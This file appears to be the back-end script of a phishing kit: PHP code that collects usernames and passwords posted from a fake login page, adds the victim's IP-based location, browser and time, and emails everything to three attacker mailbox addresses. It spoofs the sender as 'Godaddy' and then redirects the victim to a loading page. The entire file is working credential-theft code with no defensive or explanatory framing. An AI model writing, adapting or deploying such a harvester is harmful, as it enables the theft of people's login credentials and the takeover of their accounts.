<?php
$email = $_POST['username'];
require_once('./geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "=============+ LOGS +=============\n";
$message .= "username: ".$_POST['name']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "============= [ Midnightcr3w Info ] =============\n";
$message .= 	"IP: {$geoplugin->ip}\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= 	"User-Agent: ".$browser."\n";
$message.= "Date Log  : ".$date."\n";
$message.= "Time Log  : ".$time."\n";


$domain = 'Godaddy';
$subj = "Logs fall on you";
$from = "From: $domain<west>\n";
mail("anunimorigba2020@gmail.com, anunimorigba2020@yandex.com, anunimorigba2020@protonmail.ch",$subj,$message,$from,$domain);

header("Location: loading.php");
?>